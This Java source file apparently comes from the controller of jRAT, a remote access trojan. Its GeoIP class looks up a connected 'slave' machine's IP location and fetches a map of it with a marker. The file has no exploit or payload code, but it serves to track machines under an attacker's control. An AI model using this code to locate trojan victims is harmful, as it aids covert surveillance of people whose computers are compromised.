package se.jrat.controller.net;

import java.awt.Graphics;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

import javax.imageio.ImageIO;

import se.jrat.controller.AbstractSlave;
import se.jrat.controller.utils.NetUtils;

import com.redpois0n.graphs.utils.IconUtils;

public class GeoIP {

	public static final String[] ARRAY_DATA = { "IP", "Country Code", "Country Name", "Region Code", "Region Name", "City", "Zipcode", "Latitude", "Longitude", "Metro Code", "Area Code" };

	public static Map<String, String> getInfo(AbstractSlave slave) throws Exception {
		String ip = slave.getRawIP();
		
		if (ip.equals("127.0.0.1")) {
			ip = NetUtils.getIP();
		}
		
		String url = "http://freegeoip.net/json/" + ip;
		String rawData = readLine(url);
		return process(rawData);
	}
	
	public static BufferedImage getMap(int zoom, double lat, double lon, boolean drawNeedle) throws Exception {
		BufferedImage image = ImageIO.read(WebRequest.getUrl("https://maps.googleapis.com/maps/api/staticmap?center=" + lat + "," + lon + "&zoom=" + zoom + "&size=600x350"));
		
		if (drawNeedle) {
			Graphics g = image.createGraphics();
			Image needle = IconUtils.getIcon("location").getImage();
			g.drawImage(needle, image.getWidth() / 2 - 8, image.getHeight() / 2 - 8, null);
			g.dispose();
		}
		
		return image;
	}

	private static Map<String, String> process(String s) {
		s = s.replace("{", "").replace("}", "");

		String[] indexes = s.split(",");
		
		Map<String, String> map = new HashMap<String, String>();

		for (int i = 0; i < indexes.length; i++) {
			String[] v = indexes[i].replace("\"", "").split(":");

			map.put(v[0], v.length == 1 ? "" : v[1]);
		}

		return map;
	}

	private static String readLine(String urlString) {
		try {
			BufferedReader in = new BufferedReader(new InputStreamReader(new URL(urlString).openStream()));
			return in.readLine();
		} catch (Throwable t) {
			return null;
		}

	}
}
